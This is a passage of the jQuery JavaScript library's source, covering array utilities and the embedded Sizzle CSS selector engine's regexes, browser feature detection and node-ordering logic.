          if ( arr != null ) {
              if ( isArrayLike( Object( arr ) ) ) {
                  jQuery.merge( ret,
                      typeof arr === "string" ?
                      [ arr ] : arr
                  );
              } else {
                  push.call( ret, arr );
              }
          }

          return ret;
      },

      inArray: function( elem, arr, i ) {
          return arr == null ? -1 : indexOf.call( arr, elem, i );
      },

      // Support: Android <=4.0 only, PhantomJS 1 only
      // push.apply(_, arraylike) throws on ancient WebKit
      merge: function( first, second ) {
          var len = +second.length,
              j = 0,
              i = first.length;

          for ( ; j < len; j++ ) {
              first[ i++ ] = second[ j ];
          }

          first.length = i;

          return first;
      },

      grep: function( elems, callback, invert ) {
          var callbackInverse,
              matches = [],
              i = 0,
              length = elems.length,
              callbackExpect = !invert;

          // Go through the array, only saving the items
          // that pass the validator function
          for ( ; i < length; i++ ) {
              callbackInverse = !callback( elems[ i ], i );
              if ( callbackInverse !== callbackExpect ) {
                  matches.push( elems[ i ] );
              }
          }

          return matches;
      },

      // arg is for internal usage only
      map: function( elems, callback, arg ) {
          var length, value,
              i = 0,
              ret = [];

          // Go through the array, translating each of the items to their new values
          if ( isArrayLike( elems ) ) {
              length = elems.length;
              for ( ; i < length; i++ ) {
                  value = callback( elems[ i ], i, arg );

                  if ( value != null ) {
                      ret.push( value );
                  }
              }

          // Go through every key on the object,
          } else {
              for ( i in elems ) {
                  value = callback( elems[ i ], i, arg );

                  if ( value != null ) {
                      ret.push( value );
                  }
              }
          }

          // Flatten any nested arrays
          return concat.apply( [], ret );
      },

      // A global GUID counter for objects
      guid: 1,

      // Bind a function to a context, optionally partially applying any
      // arguments.
      proxy: function( fn, context ) {
          var tmp, args, proxy;

          if ( typeof context === "string" ) {
              tmp = fn[ context ];
              context = fn;
              fn = tmp;
          }

          // Quick check to determine if target is callable, in the spec
          // this throws a TypeError, but we will just return undefined.
          if ( !jQuery.isFunction( fn ) ) {
              return undefined;
          }

          // Simulated bind
          args = slice.call( arguments, 2 );
          proxy = function() {
              return fn.apply( context || this, args.concat( slice.call( arguments ) ) );
          };

          // Set the guid of unique handler to the same of original handler, so it can be removed
          proxy.guid = fn.guid = fn.guid || jQuery.guid++;

          return proxy;
      },

      now: Date.now,

      // jQuery.support is not used in Core but other projects attach their
      // properties to it so it needs to exist.
      support: support
  } );

  if ( typeof Symbol === "function" ) {
      jQuery.fn[ Symbol.iterator ] = arr[ Symbol.iterator ];
  }

  // Populate the class2type map
  jQuery.each( "Boolean Number String Function Array Date RegExp Object Error Symbol".split( " " ),
  function( i, name ) {
      class2type[ "[object " + name + "]" ] = name.toLowerCase();
  } );

  function isArrayLike( obj ) {

      // Support: real iOS 8.2 only (not reproducible in simulator)
      // `in` check used to prevent JIT error (gh-2145)
      // hasOwn isn't used here due to false negatives
      // regarding Nodelist length in IE
      var length = !!obj && "length" in obj && obj.length,
          type = jQuery.type( obj );

      if ( type === "function" || jQuery.isWindow( obj ) ) {
          return false;
      }

      return type === "array" || length === 0 ||
          typeof length === "number" && length > 0 && ( length - 1 ) in obj;
  }
  var Sizzle =
  /*!
   * Sizzle CSS Selector Engine v2.3.3
   * https://sizzlejs.com/
   *
   * Copyright jQuery Foundation and other contributors
   * Released under the MIT license
   * http://jquery.org/license
   *
   * Date: 2016-08-08
   */
  (function( window ) {

  var i,
      support,
      Expr,
      getText,
      isXML,
      tokenize,
      compile,
      select,
      outermostContext,
      sortInput,
      hasDuplicate,

      // Local document vars
      setDocument,
      document,
      docElem,
      documentIsHTML,
      rbuggyQSA,
      rbuggyMatches,
      matches,
      contains,

      // Instance-specific data
      expando = "sizzle" + 1 * new Date(),
      preferredDoc = window.document,
      dirruns = 0,
      done = 0,
      classCache = createCache(),
      tokenCache = createCache(),
      compilerCache = createCache(),
      sortOrder = function( a, b ) {
          if ( a === b ) {
              hasDuplicate = true;
          }
          return 0;
      },

      // Instance methods
      hasOwn = ({}).hasOwnProperty,
      arr = [],
      pop = arr.pop,
      push_native = arr.push,
      push = arr.push,
      slice = arr.slice,
      // Use a stripped-down indexOf as it's faster than native
      // https://jsperf.com/thor-indexof-vs-for/5
      indexOf = function( list, elem ) {
          var i = 0,
              len = list.length;
          for ( ; i < len; i++ ) {
              if ( list[i] === elem ) {
                  return i;
              }
          }
          return -1;
      },

      booleans = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",

      // Regular expressions

      // http://www.w3.org/TR/css3-selectors/#whitespace
      whitespace = "[\\x20\\t\\r\\n\\f]",

      // http://www.w3.org/TR/CSS21/syndata.html#value-def-identifier
      identifier = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",

      // Attribute selectors: http://www.w3.org/TR/selectors/#attribute-selectors
      attributes = "\\[" + whitespace + "*(" + identifier + ")(?:" + whitespace +
          // Operator (capture 2)
          "*([*^$|!~]?=)" + whitespace +
          // "Attribute values must be CSS identifiers [capture 5] or strings [capture 3 or capture 4]"
          "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + identifier + "))|)" + whitespace +
          "*\\]",

      pseudos = ":(" + identifier + ")(?:\\((" +
          // To reduce the number of selectors needing tokenize in the preFilter, prefer arguments:
          // 1. quoted (capture 3; capture 4 or capture 5)
          "('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|" +
          // 2. simple (capture 6)
          "((?:\\\\.|[^\\\\()[\\]]|" + attributes + ")*)|" +
          // 3. anything else (capture 2)
          ".*" +
          ")\\)|)",

      // Leading and non-escaped trailing whitespace, capturing some non-whitespace characters preceding the latter
      rwhitespace = new RegExp( whitespace + "+", "g" ),
      rtrim = new RegExp( "^" + whitespace + "+|((?:^|[^\\\\])(?:\\\\.)*)" + whitespace + "+$", "g" ),

      rcomma = new RegExp( "^" + whitespace + "*," + whitespace + "*" ),
      rcombinators = new RegExp( "^" + whitespace + "*([>+~]|" + whitespace + ")" + whitespace + "*" ),

      rattributeQuotes = new RegExp( "=" + whitespace + "*([^\\]'\"]*?)" + whitespace + "*\\]", "g" ),

      rpseudo = new RegExp( pseudos ),
      ridentifier = new RegExp( "^" + identifier + "$" ),

      matchExpr = {
          "ID": new RegExp( "^#(" + identifier + ")" ),
          "CLASS": new RegExp( "^\\.(" + identifier + ")" ),
          "TAG": new RegExp( "^(" + identifier + "|[*])" ),
          "ATTR": new RegExp( "^" + attributes ),
          "PSEUDO": new RegExp( "^" + pseudos ),
          "CHILD": new RegExp( "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + whitespace +
              "*(even|odd|(([+-]|)(\\d*)n|)" + whitespace + "*(?:([+-]|)" + whitespace +
              "*(\\d+)|))" + whitespace + "*\\)|)", "i" ),
          "bool": new RegExp( "^(?:" + booleans + ")$", "i" ),
          // For use in libraries implementing .is()
          // We use this for POS matching in `select`
          "needsContext": new RegExp( "^" + whitespace + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" +
              whitespace + "*((?:-\\d)?\\d*)" + whitespace + "*\\)|)(?=[^-]|$)", "i" )
      },

      rinputs = /^(?:input|select|textarea|button)$/i,
      rheader = /^h\d$/i,

      rnative = /^[^{]+\{\s*\[native \w/,

      // Easily-parseable/retrievable ID or TAG or CLASS selectors
      rquickExpr = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,

      rsibling = /[+~]/,

      // CSS escapes
      // http://www.w3.org/TR/CSS21/syndata.html#escaped-characters
      runescape = new RegExp( "\\\\([\\da-f]{1,6}" + whitespace + "?|(" + whitespace + ")|.)", "ig" ),
      funescape = function( _, escaped, escapedWhitespace ) {
          var high = "0x" + escaped - 0x10000;
          // NaN means non-codepoint
          // Support: Firefox<24
          // Workaround erroneous numeric interpretation of +"0x"
          return high !== high || escapedWhitespace ?
              escaped :
              high < 0 ?
                  // BMP codepoint
                  String.fromCharCode( high + 0x10000 ) :
                  // Supplemental Plane codepoint (surrogate pair)
                  String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 );
      },

      // CSS string/identifier serialization
      // https://drafts.csswg.org/cssom/#common-serializing-idioms
      rcssescape = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
      fcssescape = function( ch, asCodePoint ) {
          if ( asCodePoint ) {

              // U+0000 NULL becomes U+FFFD REPLACEMENT CHARACTER
              if ( ch === "\0" ) {
                  return "\uFFFD";
              }

              // Control characters and (dependent upon position) numbers get escaped as code points
              return ch.slice( 0, -1 ) + "\\" + ch.charCodeAt( ch.length - 1 ).toString( 16 ) + " ";
          }

          // Other potentially-special ASCII characters get backslash-escaped
          return "\\" + ch;
      },

      // Used for iframes
      // See setDocument()
      // Removing the function wrapper causes a "Permission Denied"
      // error in IE
      unloadHandler = function() {
          setDocument();
      },

      disabledAncestor = addCombinator(
          function( elem ) {
              return elem.disabled === true && ("form" in elem || "label" in elem);
          },
          { dir: "parentNode", next: "legend" }
      );

  // Optimize for push.apply( _, NodeList )
  try {
      push.apply(
          (arr = slice.call( preferredDoc.childNodes )),
          preferredDoc.childNodes
      );
      // Support: Android<4.0
      // Detect silently failing push.apply
      arr[ preferredDoc.childNodes.length ].nodeType;
  } catch ( e ) {
      push = { apply: arr.length ?

          // Leverage slice if possible
          function( target, els ) {
              push_native.apply( target, slice.call(els) );
          } :

          // Support: IE<9
          // Otherwise append directly
          function( target, els ) {
              var j = target.length,
                  i = 0;
              // Can't trust NodeList.length
              while ( (target[j++] = els[i++]) ) {}
              target.length = j - 1;
          }
      };
  }

  function Sizzle( selector, context, results, seed ) {
      var m, i, elem, nid, match, groups, newSelector,
          newContext = context && context.ownerDocument,

          // nodeType defaults to 9, since context defaults to document
          nodeType = context ? context.nodeType : 9;

      results = results || [];

      // Return early from calls with invalid selector or context
      if ( typeof selector !== "string" || !selector ||
          nodeType !== 1 && nodeType !== 9 && nodeType !== 11 ) {

          return results;
      }

      // Try to shortcut find operations (as opposed to filters) in HTML documents
      if ( !seed ) {

          if ( ( context ? context.ownerDocument || context : preferredDoc ) !== document ) {
              setDocument( context );
          }
          context = context || document;

          if ( documentIsHTML ) {

              // If the selector is sufficiently simple, try using a "get*By*" DOM method
              // (excepting DocumentFragment context, where the methods don't exist)
              if ( nodeType !== 11 && (match = rquickExpr.exec( selector )) ) {

                  // ID selector
                  if ( (m = match[1]) ) {

                      // Document context
                      if ( nodeType === 9 ) {
                          if ( (elem = context.getElementById( m )) ) {

                              // Support: IE, Opera, Webkit
                              // TODO: identify versions
                              // getElementById can match elements by name instead of ID
                              if ( elem.id === m ) {
                                  results.push( elem );
                                  return results;
                              }
                          } else {
                              return results;
                          }

                      // Element context
                      } else {

                          // Support: IE, Opera, Webkit
                          // TODO: identify versions
                          // getElementById can match elements by name instead of ID
                          if ( newContext && (elem = newContext.getElementById( m )) &&
                              contains( context, elem ) &&
                              elem.id === m ) {

                              results.push( elem );
                              return results;
                          }
                      }

                  // Type selector
                  } else if ( match[2] ) {
                      push.apply( results, context.getElementsByTagName( selector ) );
                      return results;

                  // Class selector
                  } else if ( (m = match[3]) && support.getElementsByClassName &&
                      context.getElementsByClassName ) {

                      push.apply( results, context.getElementsByClassName( m ) );
                      return results;
                  }
              }

              // Take advantage of querySelectorAll
              if ( support.qsa &&
                  !compilerCache[ selector + " " ] &&
                  (!rbuggyQSA || !rbuggyQSA.test( selector )) ) {

                  if ( nodeType !== 1 ) {
                      newContext = context;
                      newSelector = selector;

                  // qSA looks outside Element context, which is not what we want
                  // Thanks to Andrew Dupont for this workaround technique
                  // Support: IE <=8
                  // Exclude object elements
                  } else if ( context.nodeName.toLowerCase() !== "object" ) {

                      // Capture the context ID, setting it first if necessary
                      if ( (nid = context.getAttribute( "id" )) ) {
                          nid = nid.replace( rcssescape, fcssescape );
                      } else {
                          context.setAttribute( "id", (nid = expando) );
                      }

                      // Prefix every selector in the list
                      groups = tokenize( selector );
                      i = groups.length;
                      while ( i-- ) {
                          groups[i] = "#" + nid + " " + toSelector( groups[i] );
                      }
                      newSelector = groups.join( "," );

                      // Expand context for sibling selectors
                      newContext = rsibling.test( selector ) && testContext( context.parentNode ) ||
                          context;
                  }

                  if ( newSelector ) {
                      try {
                          push.apply( results,
                              newContext.querySelectorAll( newSelector )
                          );
                          return results;
                      } catch ( qsaError ) {
                      } finally {
                          if ( nid === expando ) {
                              context.removeAttribute( "id" );
                          }
                      }
                  }
              }
          }
      }

      // All others
      return select( selector.replace( rtrim, "$1" ), context, results, seed );
  }

  /**
   * Create key-value caches of limited size
   * @returns {function(string, object)} Returns the Object data after storing it on itself with
   *	property name the (space-suffixed) string and (if the cache is larger than Expr.cacheLength)
   *	deleting the oldest entry
   */
  function createCache() {
      var keys = [];

      function cache( key, value ) {
          // Use (key + " ") to avoid collision with native prototype properties (see Issue #157)
          if ( keys.push( key + " " ) > Expr.cacheLength ) {
              // Only keep the most recent entries
              delete cache[ keys.shift() ];
          }
          return (cache[ key + " " ] = value);
      }
      return cache;
  }

  /**
   * Mark a function for special use by Sizzle
   * @param {Function} fn The function to mark
   */
  function markFunction( fn ) {
      fn[ expando ] = true;
      return fn;
  }

  /**
   * Support testing using an element
   * @param {Function} fn Passed the created element and returns a boolean result
   */
  function assert( fn ) {
      var el = document.createElement("fieldset");

      try {
          return !!fn( el );
      } catch (e) {
          return false;
      } finally {
          // Remove from its parent by default
          if ( el.parentNode ) {
              el.parentNode.removeChild( el );
          }
          // release memory in IE
          el = null;
      }
  }

  /**
   * Adds the same handler for all of the specified attrs
   * @param {String} attrs Pipe-separated list of attributes
   * @param {Function} handler The method that will be applied
   */
  function addHandle( attrs, handler ) {
      var arr = attrs.split("|"),
          i = arr.length;

      while ( i-- ) {
          Expr.attrHandle[ arr[i] ] = handler;
      }
  }

  /**
   * Checks document order of two siblings
   * @param {Element} a
   * @param {Element} b
   * @returns {Number} Returns less than 0 if a precedes b, greater than 0 if a follows b
   */
  function siblingCheck( a, b ) {
      var cur = b && a,
          diff = cur && a.nodeType === 1 && b.nodeType === 1 &&
              a.sourceIndex - b.sourceIndex;

      // Use IE sourceIndex if available on both nodes
      if ( diff ) {
          return diff;
      }

      // Check if b follows a
      if ( cur ) {
          while ( (cur = cur.nextSibling) ) {
              if ( cur === b ) {
                  return -1;
              }
          }
      }

      return a ? 1 : -1;
  }

  /**
   * Returns a function to use in pseudos for input types
   * @param {String} type
   */
  function createInputPseudo( type ) {
      return function( elem ) {
          var name = elem.nodeName.toLowerCase();
          return name === "input" && elem.type === type;
      };
  }

  /**
   * Returns a function to use in pseudos for buttons
   * @param {String} type
   */
  function createButtonPseudo( type ) {
      return function( elem ) {
          var name = elem.nodeName.toLowerCase();
          return (name === "input" || name === "button") && elem.type === type;
      };
  }

  /**
   * Returns a function to use in pseudos for :enabled/:disabled
   * @param {Boolean} disabled true for :disabled; false for :enabled
   */
  function createDisabledPseudo( disabled ) {

      // Known :disabled false positives: fieldset[disabled] > legend:nth-of-type(n+2) :can-disable
      return function( elem ) {

          // Only certain elements can match :enabled or :disabled
          // https://html.spec.whatwg.org/multipage/scripting.html#selector-enabled
          // https://html.spec.whatwg.org/multipage/scripting.html#selector-disabled
          if ( "form" in elem ) {

              // Check for inherited disabledness on relevant non-disabled elements:
              // * listed form-associated elements in a disabled fieldset
              //   https://html.spec.whatwg.org/multipage/forms.html#category-listed
              //   https://html.spec.whatwg.org/multipage/forms.html#concept-fe-disabled
              // * option elements in a disabled optgroup
              //   https://html.spec.whatwg.org/multipage/forms.html#concept-option-disabled
              // All such elements have a "form" property.
              if ( elem.parentNode && elem.disabled === false ) {

                  // Option elements defer to a parent optgroup if present
                  if ( "label" in elem ) {
                      if ( "label" in elem.parentNode ) {
                          return elem.parentNode.disabled === disabled;
                      } else {
                          return elem.disabled === disabled;
                      }
                  }

                  // Support: IE 6 - 11
                  // Use the isDisabled shortcut property to check for disabled fieldset ancestors
                  return elem.isDisabled === disabled ||

                      // Where there is no isDisabled, check manually
                      /* jshint -W018 */
                      elem.isDisabled !== !disabled &&
                          disabledAncestor( elem ) === disabled;
              }

              return elem.disabled === disabled;

          // Try to winnow out elements that can't be disabled before trusting the disabled property.
          // Some victims get caught in our net (label, legend, menu, track), but it shouldn't
          // even exist on them, let alone have a boolean value.
          } else if ( "label" in elem ) {
              return elem.disabled === disabled;
          }

          // Remaining elements are neither :enabled nor :disabled
          return false;
      };
  }

  /**
   * Returns a function to use in pseudos for positionals
   * @param {Function} fn
   */
  function createPositionalPseudo( fn ) {
      return markFunction(function( argument ) {
          argument = +argument;
          return markFunction(function( seed, matches ) {
              var j,
                  matchIndexes = fn( [], seed.length, argument ),
                  i = matchIndexes.length;

              // Match elements found at the specified indexes
              while ( i-- ) {
                  if ( seed[ (j = matchIndexes[i]) ] ) {
                      seed[j] = !(matches[j] = seed[j]);
                  }
              }
          });
      });
  }

  /**
   * Checks a node for validity as a Sizzle context
   * @param {Element|Object=} context
   * @returns {Element|Object|Boolean} The input node if acceptable, otherwise a falsy value
   */
  function testContext( context ) {
      return context && typeof context.getElementsByTagName !== "undefined" && context;
  }

  // Expose support vars for convenience
  support = Sizzle.support = {};

  /**
   * Detects XML nodes
   * @param {Element|Object} elem An element or a document
   * @returns {Boolean} True iff elem is a non-HTML XML node
   */
  isXML = Sizzle.isXML = function( elem ) {
      // documentElement is verified for cases where it doesn't yet exist
      // (such as loading iframes in IE - #4833)
      var documentElement = elem && (elem.ownerDocument || elem).documentElement;
      return documentElement ? documentElement.nodeName !== "HTML" : false;
  };

  /**
   * Sets document-related variables once based on the current document
   * @param {Element|Object} [doc] An element or document object to use to set the document
   * @returns {Object} Returns the current document
   */
  setDocument = Sizzle.setDocument = function( node ) {
      var hasCompare, subWindow,
          doc = node ? node.ownerDocument || node : preferredDoc;

      // Return early if doc is invalid or already selected
      if ( doc === document || doc.nodeType !== 9 || !doc.documentElement ) {
          return document;
      }

      // Update global variables
      document = doc;
      docElem = document.documentElement;
      documentIsHTML = !isXML( document );

      // Support: IE 9-11, Edge
      // Accessing iframe documents after unload throws "permission denied" errors (jQuery #13936)
      if ( preferredDoc !== document &&
          (subWindow = document.defaultView) && subWindow.top !== subWindow ) {

          // Support: IE 11, Edge
          if ( subWindow.addEventListener ) {
              subWindow.addEventListener( "unload", unloadHandler, false );

          // Support: IE 9 - 10 only
          } else if ( subWindow.attachEvent ) {
              subWindow.attachEvent( "onunload", unloadHandler );
          }
      }

      /* Attributes
      ---------------------------------------------------------------------- */

      // Support: IE<8
      // Verify that getAttribute really returns attributes and not properties
      // (excepting IE8 booleans)
      support.attributes = assert(function( el ) {
          el.className = "i";
          return !el.getAttribute("className");
      });

      /* getElement(s)By*
      ---------------------------------------------------------------------- */

      // Check if getElementsByTagName("*") returns only elements
      support.getElementsByTagName = assert(function( el ) {
          el.appendChild( document.createComment("") );
          return !el.getElementsByTagName("*").length;
      });

      // Support: IE<9
      support.getElementsByClassName = rnative.test( document.getElementsByClassName );

      // Support: IE<10
      // Check if getElementById returns elements by name
      // The broken getElementById methods don't pick up programmatically-set names,
      // so use a roundabout getElementsByName test
      support.getById = assert(function( el ) {
          docElem.appendChild( el ).id = expando;
          return !document.getElementsByName || !document.getElementsByName( expando ).length;
      });

      // ID filter and find
      if ( support.getById ) {
          Expr.filter["ID"] = function( id ) {
              var attrId = id.replace( runescape, funescape );
              return function( elem ) {
                  return elem.getAttribute("id") === attrId;
              };
          };
          Expr.find["ID"] = function( id, context ) {
              if ( typeof context.getElementById !== "undefined" && documentIsHTML ) {
                  var elem = context.getElementById( id );
                  return elem ? [ elem ] : [];
              }
          };
      } else {
          Expr.filter["ID"] =  function( id ) {
              var attrId = id.replace( runescape, funescape );
              return function( elem ) {
                  var node = typeof elem.getAttributeNode !== "undefined" &&
                      elem.getAttributeNode("id");
                  return node && node.value === attrId;
              };
          };

          // Support: IE 6 - 7 only
          // getElementById is not reliable as a find shortcut
          Expr.find["ID"] = function( id, context ) {
              if ( typeof context.getElementById !== "undefined" && documentIsHTML ) {
                  var node, i, elems,
                      elem = context.getElementById( id );

                  if ( elem ) {

                      // Verify the id attribute
                      node = elem.getAttributeNode("id");
                      if ( node && node.value === id ) {
                          return [ elem ];
                      }

                      // Fall back on getElementsByName
                      elems = context.getElementsByName( id );
                      i = 0;
                      while ( (elem = elems[i++]) ) {
                          node = elem.getAttributeNode("id");
                          if ( node && node.value === id ) {
                              return [ elem ];
                          }
                      }
                  }

                  return [];
              }
          };
      }

      // Tag
      Expr.find["TAG"] = support.getElementsByTagName ?
          function( tag, context ) {
              if ( typeof context.getElementsByTagName !== "undefined" ) {
                  return context.getElementsByTagName( tag );

              // DocumentFragment nodes don't have gEBTN
              } else if ( support.qsa ) {
                  return context.querySelectorAll( tag );
              }
          } :

          function( tag, context ) {
              var elem,
                  tmp = [],
                  i = 0,
                  // By happy coincidence, a (broken) gEBTN appears on DocumentFragment nodes too
                  results = context.getElementsByTagName( tag );

              // Filter out possible comments
              if ( tag === "*" ) {
                  while ( (elem = results[i++]) ) {
                      if ( elem.nodeType === 1 ) {
                          tmp.push( elem );
                      }
                  }

                  return tmp;
              }
              return results;
          };

      // Class
      Expr.find["CLASS"] = support.getElementsByClassName && function( className, context ) {
          if ( typeof context.getElementsByClassName !== "undefined" && documentIsHTML ) {
              return context.getElementsByClassName( className );
          }
      };

      /* QSA/matchesSelector
      ---------------------------------------------------------------------- */

      // QSA and matchesSelector support

      // matchesSelector(:active) reports false when true (IE9/Opera 11.5)
      rbuggyMatches = [];

      // qSa(:focus) reports false when true (Chrome 21)
      // We allow this because of a bug in IE8/9 that throws an error
      // whenever `document.activeElement` is accessed on an iframe
      // So, we allow :focus to pass through QSA all the time to avoid the IE error
      // See https://bugs.jquery.com/ticket/13378
      rbuggyQSA = [];

      if ( (support.qsa = rnative.test( document.querySelectorAll )) ) {
          // Build QSA regex
          // Regex strategy adopted from Diego Perini
          assert(function( el ) {
              // Select is set to empty string on purpose
              // This is to test IE's treatment of not explicitly
              // setting a boolean content attribute,
              // since its presence should be enough
              // https://bugs.jquery.com/ticket/12359
              docElem.appendChild( el ).innerHTML = "<a id='" + expando + "'></a>" +
                  "<select id='" + expando + "-\r\\' msallowcapture=''>" +
                  "<option selected=''></option></select>";

              // Support: IE8, Opera 11-12.16
              // Nothing should be selected when empty strings follow ^= or $= or *=
              // The test attribute must be unknown in Opera but "safe" for WinRT
              // https://msdn.microsoft.com/en-us/library/ie/hh465388.aspx#attribute_section
              if ( el.querySelectorAll("[msallowcapture^='']").length ) {
                  rbuggyQSA.push( "[*^$]=" + whitespace + "*(?:''|\"\")" );
              }

              // Support: IE8
              // Boolean attributes and "value" are not treated correctly
              if ( !el.querySelectorAll("[selected]").length ) {
                  rbuggyQSA.push( "\\[" + whitespace + "*(?:value|" + booleans + ")" );
              }

              // Support: Chrome<29, Android<4.4, Safari<7.0+, iOS<7.0+, PhantomJS<1.9.8+
              if ( !el.querySelectorAll( "[id~=" + expando + "-]" ).length ) {
                  rbuggyQSA.push("~=");
              }

              // Webkit/Opera - :checked should return selected option elements
              // http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked
              // IE8 throws error here and will not see later tests
              if ( !el.querySelectorAll(":checked").length ) {
                  rbuggyQSA.push(":checked");
              }

              // Support: Safari 8+, iOS 8+
              // https://bugs.webkit.org/show_bug.cgi?id=136851
              // In-page `selector#id sibling-combinator selector` fails
              if ( !el.querySelectorAll( "a#" + expando + "+*" ).length ) {
                  rbuggyQSA.push(".#.+[+~]");
              }
          });

          assert(function( el ) {
              el.innerHTML = "<a href='' disabled='disabled'></a>" +
                  "<select disabled='disabled'><option/></select>";

              // Support: Windows 8 Native Apps
              // The type and name attributes are restricted during .innerHTML assignment
              var input = document.createElement("input");
              input.setAttribute( "type", "hidden" );
              el.appendChild( input ).setAttribute( "name", "D" );

              // Support: IE8
              // Enforce case-sensitivity of name attribute
              if ( el.querySelectorAll("[name=d]").length ) {
                  rbuggyQSA.push( "name" + whitespace + "*[*^$|!~]?=" );
              }

              // FF 3.5 - :enabled/:disabled and hidden elements (hidden elements are still enabled)
              // IE8 throws error here and will not see later tests
              if ( el.querySelectorAll(":enabled").length !== 2 ) {
                  rbuggyQSA.push( ":enabled", ":disabled" );
              }

              // Support: IE9-11+
              // IE's :disabled selector does not pick up the children of disabled fieldsets
              docElem.appendChild( el ).disabled = true;
              if ( el.querySelectorAll(":disabled").length !== 2 ) {
                  rbuggyQSA.push( ":enabled", ":disabled" );
              }

              // Opera 10-11 does not throw on post-comma invalid pseudos
              el.querySelectorAll("*,:x");
              rbuggyQSA.push(",.*:");
          });
      }

      if ( (support.matchesSelector = rnative.test( (matches = docElem.matches ||
          docElem.webkitMatchesSelector ||
          docElem.mozMatchesSelector ||
          docElem.oMatchesSelector ||
          docElem.msMatchesSelector) )) ) {

          assert(function( el ) {
              // Check to see if it's possible to do matchesSelector
              // on a disconnected node (IE 9)
              support.disconnectedMatch = matches.call( el, "*" );

              // This should fail with an exception
              // Gecko does not error, returns false instead
              matches.call( el, "[s!='']:x" );
              rbuggyMatches.push( "!=", pseudos );
          });
      }

      rbuggyQSA = rbuggyQSA.length && new RegExp( rbuggyQSA.join("|") );
      rbuggyMatches = rbuggyMatches.length && new RegExp( rbuggyMatches.join("|") );

      /* Contains
      ---------------------------------------------------------------------- */
      hasCompare = rnative.test( docElem.compareDocumentPosition );

      // Element contains another
      // Purposefully self-exclusive
      // As in, an element does not contain itself
      contains = hasCompare || rnative.test( docElem.contains ) ?
          function( a, b ) {
              var adown = a.nodeType === 9 ? a.documentElement : a,
                  bup = b && b.parentNode;
              return a === bup || !!( bup && bup.nodeType === 1 && (
                  adown.contains ?
                      adown.contains( bup ) :
                      a.compareDocumentPosition && a.compareDocumentPosition( bup ) & 16
              ));
          } :
          function( a, b ) {
              if ( b ) {
                  while ( (b = b.parentNode) ) {
                      if ( b === a ) {
                          return true;
                      }
                  }
              }
              return false;
          };

      /* Sorting
      ---------------------------------------------------------------------- */

      // Document order sorting
      sortOrder = hasCompare ?
      function( a, b ) {

          // Flag for duplicate removal
          if ( a === b ) {
              hasDuplicate = true;
              return 0;
          }

          // Sort on method existence if only one input has compareDocumentPosition
          var compare = !a.compareDocumentPosition - !b.compareDocumentPosition;
          if ( compare ) {
              return compare;
          }

          // Calculate position if both inputs belong to the same document
          compare = ( a.ownerDocument || a ) === ( b.ownerDocument || b ) ?
              a.compareDocumentPosition( b ) :

              // Otherwise we know they are disconnected
              1;

          // Disconnected nodes
          if ( compare & 1 ||
              (!support.sortDetached && b.compareDocumentPosition( a ) === compare) ) {

              // Choose the first element that is related to our preferred document
              if ( a === document || a.ownerDocument === preferredDoc && contains(preferredDoc, a) ) {
                  return -1;
              }
              if ( b === document || b.ownerDocument === preferredDoc && contains(preferredDoc, b) ) {
                  return 1;
              }

              // Maintain original order
              return sortInput ?
                  ( indexOf( sortInput, a ) - indexOf( sortInput, b ) ) :
                  0;
          }

          return compare & 4 ? -1 : 1;
      } :
      function( a, b ) {
          // Exit early if the nodes are identical
          if ( a === b ) {
              hasDuplicate = true;
              return 0;
          }

          var cur,
              i = 0,
              aup = a.parentNode,
              bup = b.parentNode,
              ap = [ a ],
              bp = [ b ];

          // Parentless nodes are either documents or disconnected
          if ( !aup || !bup ) {
              return a === document ? -1 :
                  b === document ? 1 :
                  aup ? -1 :
                  bup ? 1 :
                  sortInput ?
                  ( indexOf( sortInput, a ) - indexOf( sortInput, b ) ) :
                  0;

          // If the nodes are siblings, we can do a quick check
          } else if ( aup === bup ) {
              return siblingCheck( a, b );
          }

          // Otherwise we need full lists of their ancestors for comparison
          cur = a;
          while ( (cur = cur.parentNode) ) {
              ap.unshift( cur );
          }
          cur = b;
          while ( (cur = cur.parentNode) ) {
              bp.unshift( cur );
          }

          // Walk down the tree looking for a discrepancy
          while ( ap[i] === bp[i] ) {
              i++;
          }

          return i ?
              // Do a sibling check if the nodes have a common ancestor
              siblingCheck( ap[i], bp[i] ) :

              // Otherwise nodes in our document sort first
              ap[i] === preferredDoc ? -1 :
              bp[i] === preferredDoc ? 1 :
              0;
      };

      return document;
  };

  Sizzle.matches = function( expr, elements ) {
      return Sizzle( expr, null, null, elements );
  };

  Sizzle.matchesSelector = function( elem, expr ) {
      // Set document vars if needed
      if ( ( elem.ownerDocument || elem ) !== document ) {
          setDocument( elem );
      }

      // Make sure that attribute selectors are quoted
      expr = expr.replace( rattributeQuotes, "='$1']" );

      if ( support.matchesSelector && documentIsHTML &&
          !compilerCache[ expr + " " ] &&
          ( !rbuggyMatches || !rbuggyMatches.test( expr ) ) &&
          ( !rbuggyQSA     || !rbuggyQSA.test( expr ) ) ) {

          try {
              var ret = matches.call( elem, expr );

              // IE 9's matchesSelector returns false on disconnected nodes
              if ( ret || support.disconnectedMatch ||
                      // As well, disconnected nodes are said to be in a document
                      // fragment in IE 9
                      elem.document && elem.document.nodeType !== 11 ) {
                  return ret;
              }
          } catch (e) {}
      }

      return Sizzle( expr, document, null, [ elem ] ).length > 0;
  };

  Sizzle.contains = function( context, elem ) {
      // Set document vars if needed
      if ( ( context.ownerDocument || context ) !== document ) {
          setDocument( context );
      }
      return contains( context, elem );
  };

  Sizzle.attr = function( elem, name ) {
      // Set document vars if needed
      if ( ( elem.ownerDocument || elem ) !== document ) {
          setDocument( elem );
      }

      var fn = Expr.attrHandle[ name.toLowerCase() ],
          // Don't get fooled by Object.prototype properties (jQuery #13807)
          val = fn && hasOwn.call( Expr.attrHandle, name.toLowerCase() ) ?
              fn( elem, name, !documentIsHTML ) :
              undefined;

      return val !== undefined ?
          val :
          support.attributes || !documentIsHTML ?
              elem.getAttribute( name ) :
              (val = elem.getAttributeNode(name)) && val.specified ?
                  val.value :
